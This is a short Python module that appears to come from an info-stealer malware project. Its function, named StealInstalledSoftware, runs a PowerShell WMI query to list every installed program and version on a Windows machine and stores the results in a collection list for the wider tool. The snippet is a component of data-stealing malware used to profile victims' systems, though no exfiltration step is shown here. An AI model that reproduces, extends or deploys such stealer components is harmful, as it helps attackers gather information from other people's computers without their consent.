import json
from main import error_handler, ListFonction
from computer import get_commands

async def StealInstalledSoftware() -> None:
    try:
        output = await get_commands("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
        software_list = json.loads(output)
        ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
    except Exception as e:
        error_handler(f"installed softwares error - {str(e)}")
